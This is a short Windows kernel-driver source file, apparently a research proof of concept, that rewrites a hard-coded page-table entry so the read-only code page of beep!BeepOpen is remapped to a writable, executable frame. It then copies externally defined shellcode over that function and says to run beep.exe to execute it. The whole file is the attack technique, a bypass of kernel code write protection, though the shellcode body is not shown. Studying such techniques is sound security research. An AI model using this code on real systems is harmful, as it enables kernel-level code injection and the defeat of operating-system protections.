#include <ntddk.h>
#include <intrin.h>

union Pte {
    struct {
        UINT64 Present: 1;
        UINT64 Writable: 1;
        UINT64 Flags: 10;
        UINT64 Pfn: 36;
    } Bits;
    UINT64 AsInteger;
};

EXTERN_C void ShellCode();
EXTERN_C void ShellCodeEnd();

EXTERN_C
NTSTATUS
DriverEntry(
    _In_ PDRIVER_OBJECT,
    _In_ PUNICODE_STRING
    )
{
    // !pte beep!BeepOpen
    auto addrOfBeepOpen = (void*)0xfffff802359d1510;
    auto pte = (Pte*)0xFFFFE27C011ACE88;

    // W+X page frame
    constexpr auto k_WxPfn = 0x85c39;

    // Remap the page with beep!BeepOpen into the W+X page
    pte->Bits.Writable = 1;
    pte->Bits.Pfn = k_WxPfn;

    // Invalidate TLB on the current processor. Pretend that there is no other
    // core for the sake of simplicity
    auto prev = KeSetSystemAffinityThreadEx((KAFFINITY)1);
    __invlpg(addrOfBeepOpen);
    KeRevertToUserAffinityThreadEx(prev);

    // Write shell-code. This should have caused exception.
    NT_ASSERT((UINT64)ShellCodeEnd > (UINT64)ShellCode);
    const auto length = (UINT64)ShellCodeEnd - (UINT64)ShellCode;
    RtlCopyMemory(addrOfBeepOpen, ShellCode, length);

    DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "Remapped LA %p to shell code at GPA PFN %x\n", addrOfBeepOpen, k_WxPfn);
    DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "Run the beep.exe to execute shell code\n");
    return STATUS_CANCELLED;
}
